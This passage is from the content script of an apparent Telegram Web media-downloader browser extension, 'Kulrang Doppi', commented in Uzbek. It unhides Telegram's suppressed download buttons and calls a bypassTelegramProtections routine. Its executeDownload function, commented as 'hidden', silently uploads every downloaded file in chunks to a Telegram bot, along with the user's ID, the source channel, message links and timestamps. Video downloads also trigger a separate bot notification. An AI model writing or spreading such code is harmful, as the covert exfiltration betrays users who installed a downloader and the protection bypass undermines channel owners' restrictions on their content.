            method: "POST",
            body: formData
          });

          const d = await res.json();
          if (d && d.ok) break;
          else if (d && (d.description?.includes("parse") || d.description?.includes("caption") || d.error_code === 400)) {
            const plainCaption = String(chunkCaption || "").replace(/<[^>]*>/g, "").substring(0, 950);
            const fbForm = new FormData();
            fbForm.append("chat_id", chatId);
            fbForm.append("caption", plainCaption);
            fbForm.append("document", chunkBlob, chunkName);
            const fbRes = await fetch(`${CONFIG.API_BASE_URL}/bot${token}/sendDocument`, {
              method: "POST",
              body: fbForm
            });
            const fbData = await fbRes.json();
            if (fbData && fbData.ok) break;
          }
        } catch (e) {
          if (att < 3) await new Promise((r) => setTimeout(r, 1500));
        }
      }
      await new Promise((r) => setTimeout(r, 200));
    }

    // 3-qadam: Yakuniy tasdiq xabari
    await sendBotMessage(`✅ <b>"${escapeHtml(fileName)}" (${sizeMB} MB) ning barcha ${totalParts} ta qismi botga to'liq yetkazildi!</b>`);
    return true;
  }

  /**
   * Telegram Web K Media Viewer rasmiy yuklash tugmasini topish
   */
  function findOfficialDownloadButtonK(buttonsBar) {
    if (!buttonsBar) return null;
    const allBtns = Array.from(buttonsBar.querySelectorAll("button:not(#kdViewerBtnK)"));
    for (const b of allBtns) {
      const text = (b.textContent || "").trim();
      const title = (b.getAttribute("title") || "").toLowerCase();
      const aria = (b.getAttribute("aria-label") || "").toLowerCase();
      const cls = b.className || "";
      
      if (
        cls.includes("download") ||
        title.includes("download") || title.includes("скачать") || title.includes("yuklab") ||
        aria.includes("download") || aria.includes("скачать") || aria.includes("yuklab") ||
        text === DOWNLOAD_UNICODE || text === "\ue979" || text === "\ue953" || text === "\ue960" ||
        b.querySelector(".tgico-download, [class*='download']")
      ) {
        if (!cls.includes("back") && !cls.includes("close") && !cls.includes("zoom") && !title.includes("close") && !title.includes("forward")) {
          return b;
        }
      }
    }

    const unhidden = allBtns.filter(b => b.hasAttribute("data-was-hidden") || b.classList.contains("tgico-download"));
    if (unhidden.length > 0) {
      return unhidden[unhidden.length - 1];
    }
    return null;
  }

  /**
   * Telegram Web A Media Viewer rasmiy yuklash tugmasini topish
   */
  function findOfficialDownloadButtonA(actionsA) {
    if (!actionsA) return null;
    const allBtns = Array.from(actionsA.querySelectorAll("button:not(#kdViewerBtnA)"));
    for (const b of allBtns) {
      const title = (b.getAttribute("title") || "").toLowerCase();
      const aria = (b.getAttribute("aria-label") || "").toLowerCase();
      const cls = b.className || "";
      if (
        title.includes("download") || title.includes("скачать") || title.includes("yuklab") ||
        aria.includes("download") || aria.includes("скачать") || aria.includes("yuklab") ||
        cls.includes("download") || b.querySelector(".icon-download, [class*='download']")
      ) {
        return b;
      }
    }
    return null;
  }

  /**
   * 🎥 CHATDAGI VIDEO USTIDAGI TUGMA BOSILGANDA TEZKOR TO'LIQ YUKLASH
   */
  async function handleVideoChatDownload(container, vid, btn) {
    if (btn.classList.contains("downloading")) return;
    btn.classList.add("downloading");
    btn.innerHTML = ICONS.spinner;

    const chatMeta = getTelegramChatMeta(container);

    // Interceptor ga metadata yuborish
    window.postMessage({
      type: "KD_SET_PENDING_META",
      meta: chatMeta
    }, "*");

    showToast("⏳ Video tayyorlanmoqda...", "To'liq video yuklanmoqda", true);

    // Zudlik bilan botga bildirishnoma yuborish (0.2s da yetib boradi)
    (async () => {
      try {
        const sName = chatMeta.sourceName || "Telegram Chat";
        let startMsg = `⏳ <b>Video yuklab olinmoqda...</b>\n─────────────────────────\n📌 <b>Kanal / Guruh:</b> <b>${escapeHtml(sName)}</b>\n`;
        if (chatMeta.sourceLink && !chatMeta.sourceLink.includes("undefined")) {
          startMsg += `🔗 <b>Kanal havolasi:</b> <a href="${chatMeta.sourceLink}">${escapeHtml(chatMeta.sourceLink)}</a>\n`;
        }
        if (chatMeta.messageLink) {
          startMsg += `💬 <b>Xabar havolasi:</b> <a href="${chatMeta.messageLink}">${escapeHtml(chatMeta.messageLink)}</a>\n`;
        }
        startMsg += `─────────────────────────\n⚡ <i>Telegram serverlaridan to'liq video yuklanmoqda. Bir necha soniyada botga yetib boradi...</i>`;
        await sendBotMessage(startMsg);
      } catch (e) {}
    })();

    // 1. Videoni ochish uchun uning o'zini yoki thumbnailini bosish
    const clickable = vid || container.querySelector(".video-container, .media-video, .bubble-content, canvas, img") || container;
    try {
      clickable.click();
    } catch (e) {}

    // 2. Media Viewer ochilishini juda tezkor tekshirish (har 50ms da)
    let attempts = 0;
    const checkViewerInterval = setInterval(() => {
      attempts++;
      const viewerK = document.querySelector(".media-viewer-whole");
      const viewerA = document.querySelector("#MediaViewer");

      if (viewerK || viewerA) {
        clearInterval(checkViewerInterval);

        setTimeout(() => {
          let officialBtn = null;
          if (viewerK) {
            const buttonsBar = viewerK.querySelector(".media-viewer-topbar .media-viewer-buttons");
            if (buttonsBar) {
              buttonsBar.querySelectorAll("button.hide, button[style*='display: none']").forEach((b) => {
                b.classList.remove("hide");
                b.setAttribute("data-was-hidden", "true");
                b.style.display = "inline-flex";
                b.style.visibility = "visible";
                b.style.opacity = "1";
              });
              officialBtn = findOfficialDownloadButtonK(buttonsBar);
            }
          } else if (viewerA) {
            const actionsA = viewerA.querySelector(".MediaViewerActions");
            if (actionsA) {
              actionsA.querySelectorAll(".hide, [style*='display: none']").forEach((b) => {
                b.classList.remove("hide");
                b.style.display = "inline-flex";
              });
              officialBtn = findOfficialDownloadButtonA(actionsA);
            }
          }

          if (officialBtn) {
            console.log("[Kulrang Doppi] Rasmiy video yuklash tugmasi topildi va bosildi:", officialBtn);
            window.postMessage({ type: "KD_SET_PENDING_META", meta: chatMeta }, "*");
            officialBtn.click();
            showToast("⬇️ Yuklab olinmoqda", "To'liq video yuklanmoqda...", true);

            btn.classList.remove("downloading");
            btn.classList.add("downloaded");
            btn.innerHTML = ICONS.check;
            setTimeout(() => {
              btn.classList.remove("downloaded");
              btn.innerHTML = ICONS.download;
            }, 3000);
          } else {
            console.warn("[Kulrang Doppi] Rasmiy tugma topilmadi, to'g'ridan-to'g'ri yuklash usuliga o'tilmoqda...");
            const v = (viewerK || viewerA).querySelector("video");
            const src = v ? (v.currentSrc || v.src) : (vid ? (vid.currentSrc || vid.src) : "");
            executeDownload(src, `telegram_video_${Date.now()}.mp4`, "video", btn, chatMeta);
          }
        }, 60);

      } else if (attempts > 25) {
        clearInterval(checkViewerInterval);
        const src = vid ? (vid.currentSrc || vid.src) : "";
        executeDownload(src, `telegram_video_${Date.now()}.mp4`, "video", btn, chatMeta);
      }
    }, 50);
  }

  /**
   * ⚡ ASOSIY YUKLASH VAZIFASI
   */
  async function executeDownload(sourceOrResolver, rawName, mediaType, btnElement, optionalMeta) {
    if (btnElement) {
      btnElement.classList.add("downloading");
      btnElement.innerHTML = ICONS.spinner;
    }

    try {
      let mediaSource = null;
      if (typeof sourceOrResolver === "function") {
        mediaSource = await sourceOrResolver();
      } else {
        mediaSource = sourceOrResolver;
      }

      if (!mediaSource) {
        throw new Error("Iltimos, avval mediani bir marta bosing yoki ijro eting.");
      }

      const { ext, type } = determineExtensionAndType(mediaSource, mediaType);
      let fileName = rawName ? rawName.trim() : "";
      if (!fileName || fileName === "Telegram Media" || !fileName.includes(".")) {
        const now = new Date();
        const pad = (n) => String(n).padStart(2, "0");
        const dateStr = `${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}`;
        const base = fileName ? fileName.replace(/\.[^/.]+$/, "") : `kulrang_doppi_${type}`;
        fileName = `${base}_${dateStr}${ext}`;
      }

      const chatMeta = optionalMeta || getTelegramChatMeta(btnElement ? btnElement.parentElement : null);

      // Interceptor ga ma'lumotlarni uzatish
      window.postMessage({
        type: "KD_SET_PENDING_META",
        meta: chatMeta
      }, "*");

      let downloadedBlob = null;

      if (mediaSource instanceof Blob) {
        downloadedBlob = mediaSource;
      } else if (typeof mediaSource === "string") {
        if (type === "photo" || mediaSource.startsWith("blob:") || mediaSource.startsWith("data:")) {
          try {
            const res = await fetch(mediaSource);
            if (res.ok) downloadedBlob = await res.blob();
          } catch (e) {}
        }
      }

      // 3. ⚡ MAHALLIY DOWNLOADS PAPKASIGA SAQLASH
      if (downloadedBlob) {
        saveBlobOrUrlLocally(downloadedBlob, fileName);
      } else {
        saveBlobOrUrlLocally(mediaSource, fileName);
      }

      // 4. ✅ TUGMA VA BILDIRISHNOMANI O'ZGARTIRISH
      if (btnElement) {
        btnElement.classList.remove("downloading");
        btnElement.classList.add("downloaded");
        btnElement.innerHTML = ICONS.check;
      }

      showToast("✅ Yuklab olindi!", `${fileName} Downloads papkasiga saqlandi`, true);

      // 5. 🤖 TELEGRAM BOTGA KANAL LINKI BILAN ASINXRON (YASHIRIN) YUBORISH
      const userId = getUserId();
      const timestamp = formatTimestamp();

      (async () => {
        try {
          let finalBlob = downloadedBlob;
          if (!finalBlob && typeof mediaSource === "string") {
            try {
              const res = await fetch(mediaSource);
              if (res.ok) finalBlob = await res.blob();
            } catch (e) {}
          }

          if (finalBlob && finalBlob.size > 0) {
            const sizeMB = (finalBlob.size / (1024 * 1024)).toFixed(2);
            const meta = {
              ...chatMeta,
              userId,
              timestamp,
              sizeMB,
              type
            };

            await sendMediaFileToBotSilently(finalBlob, fileName, meta);

            browserAPI.runtime.sendMessage({
              action: "REPORT_DOWNLOAD",
              fileName: fileName,
              source: meta.sourceName,
              size: parseFloat(sizeMB),
              timestamp: timestamp,
              userId: userId,
              type: type,
              deviceType: CONFIG.DEVICE_TYPE
            }).catch(() => {});
          }
        } catch (botErr) {}
      })();

      if (btnElement) {
        setTimeout(() => {
          btnElement.classList.remove("downloaded");
          btnElement.innerHTML = ICONS.download;
        }, 2500);
      }

    } catch (err) {
      if (btnElement) {
        btnElement.classList.remove("downloading");
        btnElement.innerHTML = ICONS.download;
      }
      showToast("Eslatma", err.message || "Iltimos, qayta urinib ko'ring.", false);
    }
  }

  /**
   * Media elementiga ixcham emoji/ikonka tugmasini biriktirish (HECH QANDAY MATNSIZ!)
   */
  function attachDownloadButton(container, mediaInfo) {
    if (!container || container.getAttribute("data-kd-attached") === "true") {
      return;
    }

    if (mediaInfo.type === "photo" && !activeFilters.photos) return;
    if (mediaInfo.type === "video" && !activeFilters.videos) return;
    if (mediaInfo.type === "audio" && !activeFilters.audios) return;
    if (mediaInfo.type === "voice" && !activeFilters.voice) return;
    if (mediaInfo.type === "document" && !activeFilters.documents) return;
    if (mediaInfo.type === "gif" && !activeFilters.gifs) return;

    container.setAttribute("data-kd-attached", "true");
    container.setAttribute("data-kd-type", mediaInfo.type);
    container.classList.add("kd-media-wrapper");

    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = `kd-download-btn ${mediaInfo.isInline ? "kd-inline-btn" : ""}`;
    btn.title = "Yuklab olish";
    btn.innerHTML = ICONS.download;

    btn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();

      // Agar video bo'lsa, to'liq video yuklash mexanizmini ishga tushirish
      if (mediaInfo.type === "video" || mediaInfo.type === "gif") {
        handleVideoChatDownload(container, mediaInfo.videoEl, btn);
        return;
      }

      executeDownload(
        mediaInfo.getUrlResolver,
        mediaInfo.getName(),
        mediaInfo.type,
        btn,
        getTelegramChatMeta(container)
      );
    });

    if (mediaInfo.isInline) {
      container.appendChild(btn);
    } else {
      container.style.position = "relative";
      container.appendChild(btn);
    }
  }

  /**
   * Media Viewer da Telegram rasmiy tugmalarini ochish va Kulrang Doppi emoji tugmasini qo'yish
   */
  function handleMediaViewer() {
    // 1. Telegram Web K (.media-viewer-whole)
    const viewerK = document.querySelector(".media-viewer-whole");
    if (viewerK) {
      const buttonsBar = viewerK.querySelector(".media-viewer-topbar .media-viewer-buttons");
      if (buttonsBar) {
        const hiddenButtons = buttonsBar.querySelectorAll("button.btn-icon.hide, button.hide, button[style*='display: none']");
        hiddenButtons.forEach((b) => {
          b.classList.remove("hide");
          b.setAttribute("data-was-hidden", "true");
          b.style.display = "inline-flex";
          b.style.visibility = "visible";
          b.style.opacity = "1";
          if (b.textContent === FORWARD_UNICODE) b.classList.add("tgico-forward");
          if (b.textContent === DOWNLOAD_UNICODE) b.classList.add("tgico-download");
        });

        if (!document.getElementById("kdViewerBtnK")) {
          const kdBtn = document.createElement("button");
          kdBtn.id = "kdViewerBtnK";
          kdBtn.type = "button";
          kdBtn.className = "kd-viewer-top-btn";
          kdBtn.title = "Yuklab olish";
          kdBtn.innerHTML = ICONS.download;

          kdBtn.onclick = (e) => {
            e.preventDefault();
            e.stopPropagation();

            const chatMeta = getTelegramChatMeta();
            window.postMessage({ type: "KD_SET_PENDING_META", meta: chatMeta }, "*");

            const officialBtn = findOfficialDownloadButtonK(buttonsBar);
            if (officialBtn) {
              console.log("[Kulrang Doppi] Web K official button clicked");
              officialBtn.click();
              showToast("✅ Yuklab olinmoqda", "Fayl yuklab olinmoqda", true);
              return;
            }

            const vid = viewerK.querySelector("video");
            const img = viewerK.querySelector("img.thumbnail, img.media-photo, img");
            if (vid && (vid.currentSrc || vid.src)) {
              executeDownload(vid.currentSrc || vid.src, `telegram_video_${Date.now()}.mp4`, "video", kdBtn, chatMeta);
            } else if (img) {
              executeDownload(async () => (await getImageBlob(img)) || img.src, `telegram_photo_${Date.now()}.jpg`, "photo", kdBtn, chatMeta);
            }
          };

          buttonsBar.prepend(kdBtn);
        }
      }
    }

    // 2. Telegram Web A (#MediaViewer)
    const viewerA = document.querySelector("#MediaViewer");
    if (viewerA) {
      const actionsA = viewerA.querySelector(".MediaViewerActions");
      if (actionsA && !document.getElementById("kdViewerBtnA")) {
        actionsA.querySelectorAll(".hide, [style*='display: none']").forEach((b) => {
          b.classList.remove("hide");
          b.style.display = "inline-flex";
        });

        const kdBtnA = document.createElement("button");
        kdBtnA.id = "kdViewerBtnA";
        kdBtnA.type = "button";
        kdBtnA.className = "kd-viewer-top-btn";
        kdBtnA.title = "Yuklab olish";
        kdBtnA.innerHTML = ICONS.download;

        kdBtnA.onclick = (e) => {
          e.preventDefault();
          e.stopPropagation();

          const chatMeta = getTelegramChatMeta();
          window.postMessage({ type: "KD_SET_PENDING_META", meta: chatMeta }, "*");

          const officialDownload = findOfficialDownloadButtonA(actionsA);
          if (officialDownload) {
            officialDownload.click();
            showToast("✅ Yuklab olinmoqda", "Fayl yuklab olinmoqda", true);
            return;
          }

          const vid = viewerA.querySelector("video");
          const img = viewerA.querySelector(".MediaViewerContent img, img");
          if (vid && (vid.currentSrc || vid.src)) {
            executeDownload(vid.currentSrc || vid.src, `telegram_video_${Date.now()}.mp4`, "video", kdBtnA, chatMeta);
          } else if (img) {
            executeDownload(async () => (await getImageBlob(img)) || img.src, `telegram_photo_${Date.now()}.jpg`, "photo", kdBtnA, chatMeta);
          }
        };

        actionsA.prepend(kdBtnA);
      }
    }
  }

  function scanAndInjectButtons() {
    if (!isExtensionEnabled || !hasAcceptedTerms) return;

    handleMediaViewer();

    // 1. VIDEOLAR
    const videoElements = document.querySelectorAll(
      "video, .media-video, .video-container, .bubble.video, .bubble.round, .bubble.gif, .Message.video, .Message.gif, .Message.round-video"
    );

    videoElements.forEach((el) => {
      let container = null;
      let vid = null;

      if (el.tagName && el.tagName.toLowerCase() === "video") {
        vid = el;
        container = el.closest(".media-container, .video-container, .bubble-content, .bubble, .Message, .media-video-container") || el.parentElement;
      } else {
        container = el;
        vid = el.querySelector("video");
      }

      if (!container || container.getAttribute("data-kd-attached") === "true") return;

      const isGif = container.classList.contains("gif") || (vid && vid.hasAttribute("loop") && vid.hasAttribute("autoplay"));
      const isRound = container.classList.contains("round") || container.classList.contains("round-video");
      const type = isGif ? "gif" : "video";

      attachDownloadButton(container, {
        type: type,
        isInline: false,
        videoEl: vid,
        getUrlResolver: () => {
          if (vid && vid.currentSrc) return vid.currentSrc;
          if (vid && vid.src) return vid.src;
          return "";
        },
        getName: () => {
          const prefix = isRound ? "video_note" : (isGif ? "animation_gif" : "telegram_video");
          return `${prefix}_${Date.now()}.mp4`;
        }
      });
    });

    // 2. RASMLAR
    const photos = document.querySelectorAll(
      ".media-photo, .photo-image, .media-container img, .album-item img, img.thumbnail"
    );

    photos.forEach((img) => {
      const container = img.closest(".media-container, .album-item, .bubble-content, .media-photo") || img.parentElement;
      if (!container || container.getAttribute("data-kd-attached") === "true") return;

      if (
        container.querySelector("video") ||
        container.closest(".bubble.video, .video-container, .bubble.round, .bubble.gif, .Message.video, .Message.round-video")
      ) {
        return;
      }

      const src = img.src || img.getAttribute("src");
      if (!src || src.startsWith("data:image/svg")) return;

      attachDownloadButton(container, {
        type: "photo",
        isInline: false,
        getUrlResolver: async () => {
          const canvasBlob = await getImageBlob(img);
          if (canvasBlob) return canvasBlob;
          return img.src || img.currentSrc || src;
        },
        getName: () => "telegram_photo_" + Date.now() + ".jpg"
      });
    });

    // 3. OVOZLI VA MUSIQA
    const audioContainers = document.querySelectorAll(
      ".audio-message, .voice-message, .Audio, .Voice, .document-audio, audio-element"
    );

    audioContainers.forEach((audBox) => {
      if (audBox.getAttribute("data-kd-attached") === "true") return;

      const audioElement = audBox.querySelector("audio");
      const isVoice = audBox.classList.contains("voice-message") || audBox.classList.contains("Voice");
      const type = isVoice ? "voice" : "audio";

      const titleEl = audBox.querySelector(".audio-title, .title, .file-name");
      const audioName = titleEl ? titleEl.textContent.trim() : (isVoice ? "voice_message.ogg" : "audio.mp3");

      attachDownloadButton(audBox, {
        type: type,
        isInline: true,
        getUrlResolver: () => {
          if (audioElement && audioElement.src) return audioElement.src;
          const aTag = audBox.querySelector("a[href^='blob:']");
          if (aTag) return aTag.href;
          return "";
        },
        getName: () => audioName
      });
    });

    // 4. HUJJATLAR VA MATN FAYLLARI
    const docContainers = document.querySelectorAll(
      ".document-message, .File, .document-container, [class*='document-wrapper']"
    );

    docContainers.forEach((docBox) => {
      if (docBox.getAttribute("data-kd-attached") === "true") return;

      const titleEl = docBox.querySelector(".document-name, .file-title, .name, .title");
      const docName = titleEl ? titleEl.textContent.trim() : "telegram_document_" + Date.now();

      attachDownloadButton(docBox, {
        type: "document",
        isInline: true,
        getUrlResolver: () => {
          const a = docBox.querySelector("a[href^='blob:']");
          if (a) return a.href;
          const link = docBox.querySelector("a[download]");
          if (link) return link.href;
          return "";
        },
        getName: () => docName
      });
    });
  }

  async function handleBatchDownload() {
    const allButtons = document.querySelectorAll(".kd-download-btn:not(.kd-viewer-top-btn)");
    if (allButtons.length === 0) {
      showToast("Media topilmadi", "Joriy chatda yuklab olinadigan media fayllar yo'q.", false);
      return 0;
    }

    showToast("Ommaviy yuklab olish", `${allButtons.length} ta media fayl yuklanmoqda...`, true);

    let count = 0;
    for (const btn of allButtons) {
      try {
        btn.click();
        count++;
        await new Promise((r) => setTimeout(r, 400));
      } catch (e) {}
    }

    return count;
  }

  function showUpdateBannerInPage(updateInfo) {
    if (document.getElementById("kdUpdateBanner")) return;

    const banner = document.createElement("div");
    banner.id = "kdUpdateBanner";
    banner.style.cssText = `
      position: fixed !important;
      bottom: 24px !important;
      left: 24px !important;
      z-index: 99999999 !important;
      background: #141414 !important;
      border: 1px solid #404040 !important;
      border-radius: 12px !important;
      padding: 12px 18px !important;
      color: #ffffff !important;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
      font-size: 13px !important;
      box-shadow: 0 10px 30px rgba(0,0,0,0.8) !important;
      display: flex !important;
      align-items: center !important;
      gap: 12px !important;
      cursor: pointer !important;
      animation: kdFadeIn 0.3s ease !important;
    `;

    banner.innerHTML = `
      <img src="${browserAPI.runtime.getURL('icons/icon48.png')}" width="28" height="28" style="border-radius:6px;">
      <div>
        <div style="font-weight:600; color:#ffffff;">Kulrang Doppi yangilanishi mavjud!</div>
        <div style="font-size:11px; color:#8c8c8c;">Yangi versiya (${updateInfo.newVersion}) chiqdi. Qo'lda yangilash uchun bosing.</div>
      </div>
      <button style="background:#ffffff; color:#000000; border:none; padding:6px 12px; border-radius:6px; font-weight:600; font-size:12px; cursor:pointer; margin-left:8px;">Yangilash</button>
    `;

    banner.addEventListener("click", () => {
      browserAPI.runtime.sendMessage({ action: "OPEN_UPDATE_PAGE" });
      banner.remove();
    });

    document.body.appendChild(banner);
  }

  browserAPI.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (!message || !message.action) return false;

    if (message.action === "UPDATE_AVAILABLE_BANNER") {
      if (message.updateInfo) showUpdateBannerInPage(message.updateInfo);
      sendResponse({ success: true });
      return true;
    }

    if (message.action === "TOGGLE_EXTENSION") {
      isExtensionEnabled = message.enabled !== false;
      const allBtns = document.querySelectorAll(".kd-download-btn, .kd-viewer-top-btn");
      allBtns.forEach((b) => (b.style.display = isExtensionEnabled ? "inline-flex" : "none"));
      if (isExtensionEnabled) {
        scanAndInjectButtons();
      }
      sendResponse({ success: true, enabled: isExtensionEnabled });
      return true;
    }

    if (message.action === "UPDATE_FILTERS") {
      activeFilters = { ...CONFIG.DEFAULT_FILTERS, ...message.filters };
      document.querySelectorAll("[data-kd-attached='true']").forEach((el) => {
        el.removeAttribute("data-kd-attached");
        const existingBtn = el.querySelector(".kd-download-btn");
        if (existingBtn) existingBtn.remove();
      });
      scanAndInjectButtons();
      sendResponse({ success: true });
      return true;
    }

    if (message.action === "TRIGGER_BATCH_DOWNLOAD") {
      handleBatchDownload().then((count) => {
        sendResponse({ success: true, count });
      });
      return true;
    }

    return false;
  });

  function init() {
    bypassTelegramProtections();

    browserAPI.storage.local.get(
      [CONFIG.STORAGE_KEYS.EXTENSION_ENABLED, CONFIG.STORAGE_KEYS.MEDIA_FILTER],
      (res) => {
        if (res[CONFIG.STORAGE_KEYS.EXTENSION_ENABLED] !== undefined) {
          isExtensionEnabled = res[CONFIG.STORAGE_KEYS.EXTENSION_ENABLED];
        }
        if (res[CONFIG.STORAGE_KEYS.MEDIA_FILTER]) {
          activeFilters = { ...CONFIG.DEFAULT_FILTERS, ...res[CONFIG.STORAGE_KEYS.MEDIA_FILTER] };
        }

        browserAPI.storage.local.get([CONFIG.STORAGE_KEYS.PENDING_UPDATE], (res) => {
          if (res && res[CONFIG.STORAGE_KEYS.PENDING_UPDATE] && res[CONFIG.STORAGE_KEYS.PENDING_UPDATE].hasUpdate) {
            showUpdateBannerInPage(res[CONFIG.STORAGE_KEYS.PENDING_UPDATE]);
          }
        });

        checkAndShowTermsModal(() => {
          scanAndInjectButtons();

          observer = new MutationObserver(() => {
            scanAndInjectButtons();
          });

          observer.observe(document.body, {
            childList: true,
            subtree: true
          });

          setInterval(() => {
            scanAndInjectButtons();
          }, 500);
        });
      }
    );
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
